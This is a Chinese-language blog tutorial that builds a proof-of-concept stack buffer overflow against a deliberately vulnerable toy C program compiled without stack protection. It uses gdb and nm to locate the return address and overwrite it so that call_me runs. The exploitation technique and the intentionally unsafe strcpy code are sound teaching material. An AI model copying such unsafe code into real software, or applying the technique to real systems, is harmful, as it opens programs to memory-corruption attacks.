---
# MUST HAVE BEG
layout: post
disqus_identifier: 20150604-buffer-overflow-poc # DO NOT CHANGE THE VALUE ONCE SET
title: A Buffer Overflow POC
# MUST HAVE END

is_short: true
subtitle:
tags: 
- gdb
- security
- c
date: 2015-06-04 18:00:00
image: 
image_desc: 
---

	#include <stdio.h>
	#include <string.h>

	void call_me() {
	    printf("you called me \n");
	}

	void func1(char *s) {
	    char buf[16];
	    strcpy(buf, s); // buffer may overflow here
	}

	int main(int argc, char **argv) {
	    func1(argv[1]);
	}

实验的环境是Ubuntu 14.04.1，gcc 4.8.2。编译的选项如下，

    $ gcc -m32 -fno-stack-protector -g -static poc.cpp -o poc.out

目标是构造一个输入字符串覆盖函数`func1`的返回地址，使得函数`call_me`被调用到，比如，

    $ ./poc.out some-input-string-to-overflow-buffer

当程序执行到`func1`的时候，[stack][1]大概是这个样子：

    | func1's local variable | 低地址方向
    | like buf[16]           |
    |------------------------|
    | main's ebp             | <= 当前的ebp
    |------------------------|
    | return address         | <= 返回地址，就是func1返回后，main函数应该执行的下一条指令
    |------------------------|
    | main's stack ...       | 高地址方向

如果把上图中的`return address`修改成`call_me`的函数地址就可以让`call_me`被调用到。

通过`nm`可以查看`call_me`的地址（`call_me`两边的字符是C++ name mangling的副作用）

    $ nm poc.out | grep call_me
    08048e24 T _Z7call_mev

用[gdb的tui模式][2]打开可执行文件，

    $ gdb -tui poc.out

<!-- at least one blank line before <div>, <p>, <pre> or <table>,
and one blank after </div>.
but you can use <span>, <cite>, <del> freely -->
<div style="text-align: center;">
  <img src="/images/blog/buf-overflow-poc.png" alt="gdb tui snapshot" style="width:620px;">
</div>

	(gdb) set disassembly-flavor intel  # 让gdb在显示汇编时使用intel风格
	(gdb) ctrl-x 2                      # 在tui模式下同时显示代码和汇编窗口
	(gdb) focus asm                     # 焦点设在汇编窗口上，可以用上下箭头滚动窗口
	(gdb) b main                        # 进入程序时，先断住
	(gdb) run abc                       # 运行可执行文件时传入一个参数“abc”

滚动一下汇编窗口可以找到`func1`函数的返回地址`0x8048e6b`，就是`call`指令的下一条指令的地址，

    │0x8048e66 <main(int, char**)+20>        call   0x8048e38 <func1(char*)>
    │0x8048e6b <main(int, char**)+25>        mov    eax,0x0 

让程序执行到`func1`函数里，然后停住。这时，可以检查下stack是不是和上面画的示意图一致。

	(gdb) x $ebp+4
	0xffffcf9c:     0x08048e6b

`$ebp+4`（`+4`，因为可执行程序是编译成32位的）存的就是返回地址，确实是`0x8048e6b`。

函数`func1`对应的汇编指令如下，

     │0x8048e38 <func1(char*)>        push   ebp            
     │0x8048e39 <func1(char*)+1>      mov    ebp,esp     
     │0x8048e3b <func1(char*)+3>      sub    esp,0x28        
    >│0x8048e3e <func1(char*)+6>      mov    eax,DWORD PTR [ebp+0x8]     
     │0x8048e41 <func1(char*)+9>      mov    DWORD PTR [esp+0x4],eax      
     │0x8048e45 <func1(char*)+13>     lea    eax,[ebp-0x18]             
     │0x8048e48 <func1(char*)+16>     mov    DWORD PTR [esp],eax     
     │0x8048e4b <func1(char*)+19>     call   0x80481e0         
     │0x8048e50 <func1(char*)+24>     leave 
   
`call`指令会调用库函数`strcpy()`进行buffer的拷贝。在`leave`指令处设一个断点，检查下buffer拷贝的效果。

    (gdb) b *0x8048e50        #在leave处break

检查一下局部变量`buf[]`对应的内存，看看“abc”是否已经被拷贝到`buf[]`上了。`a`，`b`，`c`对应的ASCII码
为`0x61`，`0x62`，`0x63`。可以通过`man ascii`快速查看一下ASCII码表，

    $ man ascii
       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char
       ────────────────────────────────────────────────────────────────────────
       000   0     00    NUL '\0'                    100   64    40    @
       001   1     01    SOH (start of heading)      101   65    41    A
       ...
       041   33    21    !                           141   97    61    a
       042   34    22    "                           142   98    62    b
       043   35    23    #                           143   99    63    c

在gdb里检查`buf[]`对应的内存，

	(gdb) x/16bx $ebp-16   ＃'b'，以Byte为单位检查内存， '16'，检查16个Byte
	0xffffcf88:     0x01    0x00    0x00    0x00    0xe2    0x95    0x04    0x08
	0xffffcf90:     0x02    0x00    0x00    0x00    0x44    0xd0    0xff    0xff

并没有发现“abc”对应的字节。这是因为内存是以8字节对齐的。扩大内存的检查范围就可以看到`a`，`b`，`c`，

	(gdb) x/24   # 24 = 8 * 3
	0xffffcf80:     0x61    0x62    0x63    0x00    0x50    0xd0    0xff    0xff
	0xffffcf88:     0x01    0x00    0x00    0x00    0xe2    0x95    0x04    0x08
	0xffffcf90:     0x02    0x00    0x00    0x00    0x44    0xd0    0xff    0xff

所以为了覆盖`func1`的返回地址，需要24（`buf[16]`）＋ 4（`ebp`） ＋ 4（`0x08048e24`）＝ 32字节。

	$ ./poc.out 1234567890123456789012345678$'\x24'$'\x8e'$'\x04'$'\x08'
	you called me 
	Segmentation fault (core dumped)

通过`$'\x24'`可以在终端里输入一个非打印字符（详见`man bash`）。因为实验机器的字节序是Little Endian，
低位存放在内存低地址处，所以通过`$'\x24'$'\x8e'$'\x04'$'\x08'`来表示`0x08048e24`。

程序最后出现了Segmentation fault，应该是因为没有为`call_me`设立正确的返回地址导致的。

另外，快速查看机器字节序（Byte Order）的一个方法，
   
	$ lscpu
	Architecture:          x86_64
	CPU op-mode(s):        32-bit, 64-bit
	Byte Order:            Little Endian
   ...

Have Fun😄

[1]: http://www.csee.umbc.edu/~chang/cs313.s02/stack.shtml "stack"
[2]: /gdb-tui-mode.html "gdb tui mode"



